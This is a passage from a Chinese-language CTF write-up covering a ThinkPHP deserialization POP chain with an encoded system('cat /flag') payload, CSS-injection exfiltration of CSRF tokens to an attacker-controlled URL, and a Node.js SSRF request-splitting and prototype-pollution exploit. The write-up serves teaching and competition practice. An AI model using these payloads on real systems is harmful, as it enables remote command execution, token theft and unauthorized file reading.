        trait RelationShip
        {
            private $relation;
        }
        trait Attribute
        {
            private $data;
            private $withAttr;
        }
    }
    namespace think\model {
        class Pivot extends \think\Model
        {
        }
    }
    namespace {
        $a = new think\model\Pivot('');
        $b = new think\model\Pivot($a);
        echo urlencode(serialize($b));
    }
    ///public/?payload=O%3A17%3A"think%5Cmodel%5CPivot"%3A6%3A%7Bs%3A21%3A"%00think%5CModel%00lazySave"%3Bb%3A1%3Bs%3A8%3A"%00%2A%00table"%3BO%3A17%3A"think%5Cmodel%5CPivot"%3A6%3A%7Bs%3A21%3A"%00think%5CModel%00lazySave"%3Bb%3A1%3Bs%3A8%3A"%00%2A%00table"%3Bs%3A0%3A""%3Bs%3A10%3A"%00%2A%00visible"%3Ba%3A1%3A%7Bi%3A0%3Ba%3A1%3A%7Bs%3A6%3A"hu3sky"%3Bs%3A3%3A"aaa"%3B%7D%7Ds%3A21%3A"%00think%5CModel%00relation"%3Ba%3A1%3A%7Bs%3A6%3A"hu3sky"%3Bs%3A3%3A"aaa"%3B%7Ds%3A17%3A"%00think%5CModel%00data"%3Ba%3A1%3A%7Bs%3A1%3A"a"%3Bs%3A9%3A"cat+%2Fflag"%3B%7Ds%3A21%3A"%00think%5CModel%00withAttr"%3Ba%3A1%3A%7Bs%3A1%3A"a"%3Bs%3A6%3A"system"%3B%7D%7Ds%3A10%3A"%00%2A%00visible"%3Ba%3A1%3A%7Bi%3A0%3Ba%3A1%3A%7Bs%3A6%3A"hu3sky"%3Bs%3A3%3A"aaa"%3B%7D%7Ds%3A21%3A"%00think%5CModel%00relation"%3Ba%3A1%3A%7Bs%3A6%3A"hu3sky"%3Bs%3A3%3A"aaa"%3B%7Ds%3A17%3A"%00think%5CModel%00data"%3Ba%3A1%3A%7Bs%3A1%3A"a"%3Bs%3A9%3A"cat+%2Fflag"%3B%7Ds%3A21%3A"%00think%5CModel%00withAttr"%3Ba%3A1%3A%7Bs%3A1%3A"a"%3Bs%3A6%3A"system"%3B%7D%7D
## CSS Game
### 考点
  * CSS注入
**利用场景** ：能HTML注入，不能XSS(或者被dompurity时)，可造成窃取CSRF Token的目的。
### 题解
通过CSS选择器匹配到CSRF token，接着使用可以发送数据包的属性将数据带出，例如：
    input[name=csrf][value^=ca]{
        background-image: url(https://xxx.com/ca);
    }
过程中有几个问题：  
一般CSRF Token的type都为hidden，会有不加载`background-image`属性的情况(本地测试是最新版FIrefox不加载，Chrome加载)
解决该问题的办法是使用`~`兄弟选择器(选择和其后具有相同父元素的元素)，加载相邻属性的`background-image`，达到将数据带出的目的。
赛题源码：
poc: 通过注入CSS，动态猜解每一个flag字符,同时在服务端监听：
    input[name=flag][value^="b"] ~ * {
    background-image: url("http://x.x.x.x/b");
    }
通过上述手段只能CSRF Token的部分数据，那我们该如何获得全部数据呢？  
poc：  
通过不断创建iframe，动态猜解每一位csrf token
当然这需要目标站点`x-frame-options`未被禁用，当然本题并未限制此方法
那iframe被禁用了，还有办法注入吗？  
参考这篇文章所述：
提供了一个工具，使得可以通过import CSS来获得token：
安装好环境, 起一个窃取CSS模板文件：  
template
    input[name=flag][value^="{{:token:}}"] ~ * { background-image: url("{{:callback:}}"); }
运行服务：
    ./sic -p 3000 --ph "http://127.0.0.1:3000" --ch "http://127.0.0.1:3001" -t template
attack:
    http://127.0.0.1:60000/flag.html?css=http://127.0.0.1:3000/staging?len=32
## membershop
### 考点
  * 拉丁文越权
  * ssrf
  * 原型链污染
### 题解
登陆的时候过滤了admin，同时发现小写字符转换成了大写字母显示。结合set-cookie是koa的框架，很容易联想到后端使用`toUpperCase()`做转换，拉丁文越权登陆`admın`
登陆成功之后多了一个请求记录的功能，同时登陆成功后给出源码的地址
拿到源码后简单看登陆逻辑  
逻辑根据传入的用户名`userName`会在登陆前经过一次检测  
当传入的用户名包含`admin`时，则自动循环replace掉。在登陆成功的同时会把`username`写进session里，这里可以看到只有我们登陆了`admin`才有权限加载其他模版  
漏洞点在代码76-117行，它只允许请求以`http://127.0.0.1:3000/query`(后面拉到本地环境会改127.0.0.1这个地址，这是我本地debug)开头的url。输入其他开头的url会被`error
url`，而且不存在任何host的绕过。当请求之后会被记录在sandbox的results.txt里面并且支持追加，sandbox根据ip建立  
因为query也是一个路由，那么这里就存在一个ssrf。如何bypass去请求其他路由呢？只需要用unicode编码并且分割http包，例如
    http://127.0.0.1:3000/query?param=1\u{0120}HTTP/1.1\u{010D}\u{010A}Host:\u{0120}127.0.0.1:3000\u{010D}\u{010A}Connection:\u{0120}keep-alive\u{010D}\u{010A}\u{010D}\u{010A}GET\u{0120}/\u{0173}\u{0161}\u{0176}\u{0165}
url编码是16进制，\u{01xx}在http.get的时候不会进行percent
encode，但是在buffer写入的时候会把xx解码。其中`\u{0173}\u{0161}\u{0176}\u{0165}`代表的是`save`，73617665是`save`的16进制表示。具体原理可以看:[通过拆分请求来实现的SSRF攻击](https://www.4hou.com/vulnerable/13637.html)
接着就寻找一下其他路由存在的问题，可利用点在`/save`
    home.get('/save',async(ctx)=>{
        let ip = ctx.request.ip;
        let reqbody = {switch:false}
        reqbody = qs.parse(ctx.querystring,{allowPrototypes: false});
        if (ip.substr(0, 7) == "::ffff:") {
            ip = ip.substr(7);
        }
        if (ip !== '127.0.0.1' && ip !== server_ip) {
            ctx.status = 403;
            ctx.response.body = '403: You are not the local user';
        }else {
            if(reqbody.switch === true && reqbody.sandbox && reqbody.opath &&fs.existsSync(reqbody.spath)){
                if(fs.existsSync(reqbody.sandbox)){
                    paths.opath = fs.readdirSync(reqbody.sandbox)[0];
                }else if(fs.existsSync(reqbody.opath)){
                    let buffer;
                    tmp[reqbody.sandbox]['opath'] = reqbody.opath;
                    if(/[flag]/.test(tmp[reqbody.sandbox]['opath'])){
                        buffer = tmp[reqbody.sandbox]['opath'].replace(/f|l|a|g/g,'');
                    }else{
                        buffer = reqbody.opath;
                    }
                }
                let opath = paths.opath? paths.opath : buffer;
                let text = fs.readFileSync(opath, 'utf8');
                await WriteResults(reqbody.spath,text);
            }else{
                return false;
            }
        }
    })
这里大致有两个障碍点：
1、限制了本地127.0.0.1访问  
->ssrf解决
2、通过qs包解析url参数存为对象，switch默认为flase，配置`allowPrototypes=false`，直接传递http参数不能覆盖switch。qs.parse()
bypass for prototype pollution@qs
    paths.opath = /flag
构造一下就能把flag追加写入到sandbox/results.txt。poc如下，调整一下opath为flag地址，sandbox为自己的`md5(ip)`就行了：
    encodeURI("http://127.0.0.1:3000/query?param=1\u{0120}HTTP/1.1\u{010D}\u{010A}Host:\u{0120}127.0.0.1:3000\u{010D}\u{010A}Connection:\u{0120}keep-alive\u{010D}\u{010A}\u{010D}\u{010A}GET\u{0120}/\u{0173}\u{0161}\u{0176}\u{0165}?]=switch&sandbox=__proto__&opath=/flag&spath=tmp/ab54a5cf83f67d827ecba68e394f9196")
# Misc
## 吹着贝斯扫二维码
### 考点
  * 二维码处理
### 题解
flag压缩包需要密码才能解压，压缩包的备注有被加密的字符串。
`GNATOMJVIQZUKNJXGRCTGNRTGI3EMNZTGNBTKRJWGI2UIMRRGNBDEQZWGI3DKMSFGNCDMRJTII3TMNBQGM4TERRTGEZTOMRXGQYDGOBWGI2DCNBY`
除了压缩包外有36个文件，将文件名修改为jpg会发现是二维码是一部分。
对二维码的处理有两种方式：